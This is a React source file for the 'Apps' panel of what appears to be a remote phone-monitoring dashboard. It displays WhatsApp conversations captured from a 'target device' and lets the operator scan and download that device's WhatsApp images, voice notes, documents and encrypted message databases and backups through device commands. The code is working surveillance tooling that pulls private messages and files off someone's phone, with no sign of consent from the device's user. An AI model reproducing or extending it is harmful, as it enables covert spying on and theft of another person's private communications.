import { useEffect, useMemo, useState } from "react";
import { devicesApi } from "../api/devices";
import { downloadFileViaRelay } from "../api/fileDownload";
import type { WhatsAppChatSummary, WhatsAppMessage } from "../api/types";

interface FileEntryDtoLocal {
  name: string;
  path: string;
  isDirectory: boolean;
  sizeBytes: number | null;
  mimeType: string | null;
}

function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function parentOf(path: string): string {
  const normalized = path.replace(/\\/g, "/");
  const idx = normalized.lastIndexOf("/");
  return idx === -1 ? "" : normalized.slice(0, idx);
}

function timeAgo(dateString: string): string {
  try {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMin = Math.floor(diffMs / 60000);
    if (diffMin < 1) return "Just now";
    if (diffMin < 60) return `${diffMin}m ago`;
    const diffHours = Math.floor(diffMin / 60);
    if (diffHours < 24) return `${diffHours}h ago`;
    const diffDays = Math.floor(diffHours / 24);
    if (diffDays < 7) return `${diffDays}d ago`;
    return date.toLocaleDateString();
  } catch {
    return dateString;
  }
}

export default function AppsCard({ deviceId }: { deviceId: string }) {
  // Navigation tabs
  const [activeApp, setActiveApp] = useState<"whatsapp">("whatsapp");
  const [subTab, setSubTab] = useState<"chats" | "files">("chats");

  // WhatsApp Chats State
  const [chats, setChats] = useState<WhatsAppChatSummary[]>([]);
  const [selectedChat, setSelectedChat] = useState<string | null>(null);
  const [messages, setMessages] = useState<WhatsAppMessage[]>([]);
  const [chatSearch, setChatSearch] = useState("");
  const [loadingChats, setLoadingChats] = useState(false);
  const [loadingMessages, setLoadingMessages] = useState(false);

  // WhatsApp Files State
  const [files, setFiles] = useState<FileEntryDtoLocal[] | null>(null);
  const [filesLoading, setFilesLoading] = useState(false);
  const [fileStatus, setFileStatus] = useState<string | null>(null);
  const [currentPath, setCurrentPath] = useState("");
  const [categoryFilter, setCategoryFilter] = useState<"all" | "images" | "voice" | "docs" | "db">("all");
  const [downloadingFile, setDownloadingFile] = useState<string | null>(null);

  // Load chats on mount & on subTab switch
  const loadChats = async () => {
    setLoadingChats(true);
    try {
      const data = await devicesApi.whatsAppChats(deviceId);
      setChats(data);
      if (data.length > 0 && !selectedChat) {
        setSelectedChat(data[0].chat_name);
      }
    } catch (e) {
      console.error("Failed to load WhatsApp chats", e);
    } finally {
      setLoadingChats(false);
    }
  };

  useEffect(() => {
    loadChats();
  }, [deviceId]);

  // Load messages when selectedChat changes
  useEffect(() => {
    if (!selectedChat) {
      setMessages([]);
      return;
    }
    setLoadingMessages(true);
    devicesApi
      .whatsAppMessages(deviceId, selectedChat)
      .then((msgs) => setMessages(msgs))
      .catch((e) => console.error("Failed to load messages for chat", e))
      .finally(() => setLoadingMessages(false));
  }, [deviceId, selectedChat]);

  // Polling helper for file commands
  async function pollCommand(commandId: string, label: string) {
    setFileStatus(`${label}: waiting for device response...`);
    const maxAttempts = 25;
    for (let i = 0; i < maxAttempts; i++) {
      const delay = i < 6 ? 1000 : 2000;
      await new Promise((r) => setTimeout(r, delay));
      try {
        const cmd = await devicesApi.getCommand(deviceId, commandId);
        if (cmd.status === "acked") {
          setFileStatus(`${label}: completed successfully.`);
          return cmd;
        }
        if (cmd.status === "failed") {
          const failMsg = (cmd.result as { message?: string } | undefined)?.message;
          setFileStatus(`${label}: failed${failMsg ? ` (${failMsg})` : "."}`);
          return cmd;
        }
      } catch {
        // network retry
      }
    }
    setFileStatus(`${label}: request taking longer (device may be sleeping or syncing).`);
    return null;
  }

  // Scan WhatsApp Files via command
  async function handleScanWhatsAppFiles() {
    setFilesLoading(true);
    setFiles(null);
    setCurrentPath("");
    setFileStatus("Requesting WhatsApp files from device...");
    try {
      const cmd = await devicesApi.createCommand(deviceId, "whatsapp_file_list");
      const result = await pollCommand(cmd.id, "WhatsApp File Scan");
      if (result?.status === "acked") {
        const full = await devicesApi.getCommand(deviceId, cmd.id);
        const fileList = (full.result?.files as FileEntryDtoLocal[]) || [];
        setFiles(fileList);
        if (fileList.length > 0) {
          // Default to the highest common parent or first directory
          const firstDir = fileList.find((f) => f.isDirectory);
          if (firstDir) setCurrentPath(parentOf(firstDir.path));
        }
      }
    } catch (e) {
      setFileStatus(`Failed to scan files: ${(e as Error).message}`);
    } finally {
      setFilesLoading(false);
    }
  }

  // Download WhatsApp File via WebSocket relay
  async function handleDownloadFile(file: FileEntryDtoLocal) {
    setDownloadingFile(file.path);
    setFileStatus(`Preparing download for: ${file.name}...`);
    try {
      const cmd = await devicesApi.createCommand(deviceId, "file_download", { path: file.path });
      const downloadPromise = downloadFileViaRelay(cmd.id, (s) => setFileStatus(s));
      await pollCommand(cmd.id, `Download: ${file.name}`);
      await downloadPromise;
      setFileStatus(`Downloaded ${file.name} successfully.`);
    } catch (e) {
      setFileStatus(`Download failed: ${(e as Error).message}`);
    } finally {
      setDownloadingFile(null);
    }
  }

  // Filtered Chats
  const filteredChats = useMemo(() => {
    if (!chatSearch.trim()) return chats;
    return chats.filter((c) =>
      c.chat_name.toLowerCase().includes(chatSearch.toLowerCase())
    );
  }, [chats, chatSearch]);

  // File explorer directory children
  const directoryChildren = useMemo(() => {
    if (!files) return [];
    let list = files;
    if (categoryFilter === "images") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("images") ||
          f.mimeType?.startsWith("image/") ||
          /\.(jpg|jpeg|png|webp)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "voice") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("voice notes") ||
          f.path.toLowerCase().includes("audio") ||
          /\.(opus|ogg|mp3|m4a|wav)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "docs") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("documents") ||
          /\.(pdf|doc|docx|txt|xlsx|pptx)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }
    if (categoryFilter === "db") {
      list = files.filter(
        (f) =>
          f.path.toLowerCase().includes("databases") ||
          f.path.toLowerCase().includes("backups") ||
          /\.(crypt\d+|db|bak)$/i.test(f.name)
      );
      return list.sort((a, b) => (a.isDirectory === b.isDirectory ? a.name.localeCompare(b.name) : a.isDirectory ? -1 : 1));
    }

    // Default: browse by currentPath
    return list
      .filter((f) => parentOf(f.path) === currentPath)
      .sort((a, b) => {
        if (a.isDirectory !== b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.localeCompare(b.name);
      });
  }, [files, currentPath, categoryFilter]);

  const breadcrumbs = currentPath ? currentPath.split("/").filter(Boolean) : [];

  return (
    <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
      {/* Top Header: Apps Section Banner */}
      <div className="px-5 py-4 border-b border-gray-100 bg-gradient-to-r from-gray-50 to-white flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-lg bg-emerald-500/10 text-emerald-600 flex items-center justify-center font-bold text-lg shadow-xs">
            📱
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-base font-bold text-gray-900 tracking-tight">Apps</h2>
              <button
                type="button"
                onClick={() => setActiveApp("whatsapp")}
                className={`text-[11px] font-semibold uppercase px-2.5 py-0.5 rounded-full border transition flex items-center gap-1.5 ${
                  activeApp === "whatsapp"
                    ? "bg-emerald-50 text-emerald-700 border-emerald-200"
                    : "bg-gray-50 text-gray-500 border-gray-200"
                }`}
              >
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                WhatsApp
              </button>
            </div>
            <p className="text-xs text-gray-500">
              Chat-wise messaging logs and WhatsApp media/database file manager
            </p>
          </div>
        </div>

        {/* Action Controls */}
        <div className="flex items-center gap-2">
          {/* Sub-tabs: Chats vs File Manager */}
          <div className="bg-gray-100 p-0.5 rounded-lg flex text-xs font-medium">
            <button
              onClick={() => setSubTab("chats")}
              className={`px-3 py-1.5 rounded-md transition flex items-center gap-1.5 ${
                subTab === "chats"
                  ? "bg-white text-gray-900 shadow-xs font-semibold"
                  : "text-gray-500 hover:text-gray-900"
              }`}
            >
              <span>💬</span>
              <span>Chats ({chats.length})</span>
            </button>
            <button
              onClick={() => setSubTab("files")}
              className={`px-3 py-1.5 rounded-md transition flex items-center gap-1.5 ${
                subTab === "files"
                  ? "bg-white text-gray-900 shadow-xs font-semibold"
                  : "text-gray-500 hover:text-gray-900"
              }`}
            >
              <span>📁</span>
              <span>WhatsApp Files</span>
            </button>
          </div>

          <button
            onClick={() => {
              if (subTab === "chats") loadChats();
              else handleScanWhatsAppFiles();
            }}
            className="text-xs text-gray-400 hover:text-emerald-600 px-2 py-1.5 border border-gray-200 rounded-lg hover:border-emerald-300 transition flex items-center gap-1"
            title="Refresh"
          >
            <span>↻</span>
            <span className="hidden sm:inline">Refresh</span>
          </button>
        </div>
      </div>

      {/* ========================================================================= */}
      {/* VIEW 1: CHAT-WISE DATA                                                    */}
      {/* ========================================================================= */}
      {subTab === "chats" && (
        <div className="grid grid-cols-1 md:grid-cols-12 min-h-[480px] max-h-[640px]">
          {/* Left Column: Chats List */}
          <div className="md:col-span-4 lg:col-span-4 border-r border-gray-100 flex flex-col bg-gray-50/50">
            {/* Search input */}
            <div className="p-3 border-b border-gray-100 bg-white">
              <div className="relative">
                <input
                  type="text"
                  placeholder="Search chats..."
                  value={chatSearch}
                  onChange={(e) => setChatSearch(e.target.value)}
                  className="w-full text-xs pl-8 pr-3 py-2 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:bg-white transition"
                />
                <span className="absolute left-2.5 top-2.5 text-gray-400 text-xs">🔍</span>
              </div>
            </div>

            {/* Chats Scroll Area */}
            <div className="flex-1 overflow-y-auto divide-y divide-gray-100">
              {loadingChats && chats.length === 0 ? (
                <div className="p-6 text-center text-xs text-gray-400">Loading chats...</div>
              ) : filteredChats.length === 0 ? (
                <div className="p-8 text-center text-xs text-gray-400 space-y-2">
                  <span className="text-2xl block">💬</span>
                  <p className="font-medium text-gray-600">No WhatsApp chats recorded yet</p>
                  <p className="text-[11px] text-gray-400 leading-relaxed max-w-xs mx-auto">
                    Messages are captured in real-time as WhatsApp is used or as incoming WhatsApp notifications arrive.
                  </p>
                </div>
              ) : (
                filteredChats.map((c) => {
                  const isSelected = selectedChat === c.chat_name;
                  return (
                    <div
                      key={c.chat_name}
                      onClick={() => setSelectedChat(c.chat_name)}
                      className={`p-3 cursor-pointer transition flex items-start gap-3 ${
                        isSelected
                          ? "bg-white border-l-4 border-emerald-500 shadow-xs"
                          : "hover:bg-white/80"
                      }`}
                    >
                      {/* Avatar */}
                      <div className="w-10 h-10 rounded-full bg-gradient-to-br from-emerald-500 to-teal-600 text-white flex items-center justify-center font-bold text-sm shrink-0 shadow-xs">
                        {c.chat_name.charAt(0).toUpperCase()}
                      </div>

                      {/* Info */}
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between gap-1 mb-0.5">
                          <h4 className="text-xs font-bold text-gray-900 truncate">
                            {c.chat_name}
                          </h4>
                          <span className="text-[10px] text-gray-400 shrink-0">
                            {timeAgo(c.last_message_at)}
                          </span>
                        </div>
                        <p className="text-[11px] text-gray-500 truncate flex items-center gap-1">
                          {c.last_is_outgoing && (
                            <span className="text-emerald-600 font-semibold text-[10px]">✓</span>
                          )}
                          <span>{c.last_message || "(Media message)"}</span>
                        </p>
                        <div className="mt-1 flex items-center gap-1.5">
                          <span className="text-[9px] font-medium bg-gray-100 text-gray-600 px-1.5 py-0.2 rounded">
                            {c.total_messages} {c.total_messages === 1 ? "msg" : "msgs"}
                          </span>
                        </div>
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          </div>

          {/* Right Column: Chat Conversation Thread */}
          <div className="md:col-span-8 lg:col-span-8 flex flex-col bg-slate-50/70">
            {selectedChat ? (
              <>
                {/* Thread Header */}
                <div className="p-3.5 border-b border-gray-100 bg-white flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-9 h-9 rounded-full bg-emerald-600 text-white flex items-center justify-center font-semibold text-sm">
                      {selectedChat.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <h3 className="text-xs font-bold text-gray-900">{selectedChat}</h3>
                      <p className="text-[10px] text-gray-400">
                        {messages.length} messages in thread
                      </p>
                    </div>
                  </div>
                  <div className="text-[11px] text-gray-400 font-mono">
                    WhatsApp Chat View
                  </div>
                </div>

                {/* Messages Canvas */}
                <div className="flex-1 p-4 overflow-y-auto space-y-3 bg-[radial-gradient(#e5e7eb_1px,transparent_1px)] [background-size:16px_16px]">
                  {loadingMessages ? (
                    <div className="text-center py-10 text-xs text-gray-400">
                      Loading conversation...
                    </div>
                  ) : messages.length === 0 ? (
                    <div className="text-center py-12 text-xs text-gray-400">
                      No messages recorded for this chat.
                    </div>
                  ) : (
                    messages.map((m) => {
                      const isMe = m.is_outgoing;
                      return (
                        <div
                          key={m.id}
                          className={`flex ${isMe ? "justify-end" : "justify-start"}`}
                        >
                          <div
                            className={`max-w-[78%] rounded-2xl px-3.5 py-2 shadow-xs space-y-1 text-xs relative ${
                              isMe
                                ? "bg-emerald-600 text-white rounded-br-xs"
                                : "bg-white text-gray-800 border border-gray-100 rounded-bl-xs"
                            }`}
                          >
                            {!isMe && m.sender && m.sender !== selectedChat && (
                              <p className="text-[10px] font-bold text-emerald-700 mb-0.5">
                                {m.sender}
                              </p>
                            )}

                            <p className="whitespace-pre-wrap break-words leading-relaxed text-[12px]">
                              {m.message_text}
                            </p>

                            <div
                              className={`flex items-center justify-end gap-1 text-[9px] pt-0.5 ${
                                isMe ? "text-emerald-100" : "text-gray-400"
                              }`}
                            >
                              <span>
                                {new Date(m.message_time).toLocaleTimeString([], {
                                  hour: "2-digit",
                                  minute: "2-digit",
                                })}
                              </span>
                              {isMe && <span>✓✓</span>}
                            </div>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              </>
            ) : (
              <div className="flex-1 flex flex-col items-center justify-center p-8 text-center text-gray-400 space-y-2">
                <span className="text-4xl block">💬</span>
                <p className="text-sm font-semibold text-gray-700">No Chat Selected</p>
                <p className="text-xs text-gray-400 max-w-sm">
                  Select a chat on the left panel to read the full conversation thread and message details.
                </p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* VIEW 2: WHATSAPP FILE EXPLORER (LIKE FILE MANAGER)                        */}
      {/* ========================================================================= */}
      {subTab === "files" && (
        <div className="p-5 space-y-4">
          {/* Controls Bar */}
          <div className="flex flex-wrap items-center justify-between gap-3 bg-gray-50/80 p-3 rounded-lg border border-gray-100">
            <div className="flex items-center gap-2">
              <button
                onClick={handleScanWhatsAppFiles}
                disabled={filesLoading}
                className="flex items-center gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold px-3 py-1.5 rounded-lg shadow-xs hover:shadow transition disabled:opacity-50"
              >
                <span>{filesLoading ? "⌛" : "🔍"}</span>
                <span>{filesLoading ? "Scanning Phone..." : "Scan WhatsApp Storage"}</span>
              </button>

              {fileStatus && (
                <span className="text-xs text-gray-500 italic max-w-md truncate">
                  {fileStatus}
                </span>
              )}
            </div>

            {/* Category Pills */}
            <div className="flex flex-wrap gap-1 text-[11px]">
              <button
                onClick={() => setCategoryFilter("all")}
                className={`px-2.5 py-1 rounded-md transition font-medium ${
                  categoryFilter === "all"
                    ? "bg-gray-800 text-white"
                    : "bg-white border text-gray-600 hover:bg-gray-50"
                }`}
              >
                All Folders
              </button>
              <button
                onClick={() => setCategoryFilter("images")}
                className={`px-2.5 py-1 rounded-md transition font-medium ${
                  categoryFilter === "images"
                    ? "bg-emerald-700 text-white"
                    : "bg-white border text-gray-600 hover:bg-gray-50"
                }`}
              >
                📷 Images
              </button>
              <button
                onClick={() => setCategoryFilter("voice")}
                className={`px-2.5 py-1 rounded-md transition font-medium ${
                  categoryFilter === "voice"
                    ? "bg-emerald-700 text-white"
                    : "bg-white border text-gray-600 hover:bg-gray-50"
                }`}
              >
                🎙️ Voice Notes & Audio
              </button>
              <button
                onClick={() => setCategoryFilter("docs")}
                className={`px-2.5 py-1 rounded-md transition font-medium ${
                  categoryFilter === "docs"
                    ? "bg-emerald-700 text-white"
                    : "bg-white border text-gray-600 hover:bg-gray-50"
                }`}
              >
                📄 Documents
              </button>
              <button
                onClick={() => setCategoryFilter("db")}
                className={`px-2.5 py-1 rounded-md transition font-medium ${
                  categoryFilter === "db"
                    ? "bg-emerald-700 text-white"
                    : "bg-white border text-gray-600 hover:bg-gray-50"
                }`}
              >
                💾 Databases & Backups
              </button>
            </div>
          </div>

          {/* Breadcrumbs for folder navigation */}
          {files && categoryFilter === "all" && (
            <div className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-50 rounded-lg text-xs font-mono overflow-x-auto text-gray-600">
              <button
                onClick={() => setCurrentPath("")}
                className="hover:underline font-semibold text-emerald-700"
              >
                WhatsApp
              </button>
              {breadcrumbs.map((seg, i) => {
                const segPath = breadcrumbs.slice(0, i + 1).join("/");
                const isLast = i === breadcrumbs.length - 1;
                return (
                  <span key={segPath} className="flex items-center gap-1.5">
                    <span className="text-gray-300">/</span>
                    <button
                      onClick={() => setCurrentPath(segPath)}
                      className={`hover:underline ${isLast ? "font-bold text-gray-900" : "text-emerald-700"}`}
                    >
                      {seg}
                    </button>
                  </span>
                );
              })}
            </div>
          )}

          {/* Files Table */}
          {files ? (
            <div className="border border-gray-200 rounded-lg overflow-hidden">
              <div className="max-h-96 overflow-y-auto">
                {directoryChildren.length === 0 ? (
                  <div className="p-8 text-center text-xs text-gray-400">
                    No files found in this folder or category.
                  </div>
                ) : (
                  <table className="w-full text-xs text-left">
                    <thead className="bg-gray-50 text-gray-500 font-semibold border-b sticky top-0">
                      <tr>
                        <th className="px-3.5 py-2">Name</th>
                        <th className="px-3 py-2">Path / Type</th>
                        <th className="px-3 py-2 text-right">Size</th>
                        <th className="px-3.5 py-2 text-right pr-4">Action</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-100">
                      {directoryChildren.map((f) => {
                        const isDownloading = downloadingFile === f.path;
                        return (
                          <tr
                            key={f.path}
                            className="hover:bg-emerald-50/40 transition group"
                          >
                            <td
                              className="px-3.5 py-2.5 font-medium cursor-pointer"
                              onClick={() => {
                                if (f.isDirectory) setCurrentPath(f.path);
                              }}
                            >
                              <div className="flex items-center gap-2">
                                <span className="text-base">
                                  {f.isDirectory
                                    ? "📁"
                                    : f.name.endsWith(".opus") || f.name.endsWith(".mp3")
                                    ? "🎙️"
                                    : /\.(jpg|jpeg|png|webp)$/i.test(f.name)
                                    ? "🖼️"
                                    : f.name.includes("crypt") || f.name.endsWith(".db")
                                    ? "💾"
                                    : "📄"}
                                </span>
                                <span className="text-gray-900 group-hover:text-emerald-700 transition">
                                  {f.name}
                                </span>
                              </div>
                            </td>
                            <td className="px-3 py-2 text-gray-500 text-[11px] font-mono truncate max-w-xs">
                              {f.isDirectory ? "Folder" : f.path}
                            </td>
                            <td className="px-3 py-2 text-right text-gray-500 font-mono whitespace-nowrap">
                              {f.sizeBytes != null ? formatSize(f.sizeBytes) : "—"}
                            </td>
                            <td className="px-3.5 py-2 text-right pr-4 whitespace-nowrap">
                              {f.isDirectory ? (
                                <button
                                  type="button"
                                  onClick={() => setCurrentPath(f.path)}
                                  className="text-[11px] text-emerald-600 hover:underline font-semibold"
                                >
                                  Open →
                                </button>
                              ) : (
                                <button
                                  type="button"
                                  onClick={() => handleDownloadFile(f)}
                                  disabled={isDownloading}
                                  className="inline-flex items-center gap-1 text-[11px] px-2.5 py-1 bg-white hover:bg-emerald-50 text-emerald-700 border border-emerald-300 rounded font-medium shadow-2xs transition disabled:opacity-50"
                                >
                                  <span>{isDownloading ? "⌛" : "⬇"}</span>
                                  <span>{isDownloading ? "Downloading..." : "Download"}</span>
                                </button>
                              )}
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                )}
              </div>
            </div>
          ) : (
            <div className="border border-dashed border-gray-200 rounded-xl p-10 text-center space-y-3">
              <span className="text-4xl block">📁</span>
              <h4 className="text-sm font-bold text-gray-800">
                Browse WhatsApp Media & Storage Directly
              </h4>
              <p className="text-xs text-gray-500 max-w-md mx-auto leading-relaxed">
                Click "Scan WhatsApp Storage" above to inspect WhatsApp's actual folder tree (Images, Voice Notes, Documents, and Databases) on the target device like a dedicated file manager.
              </p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
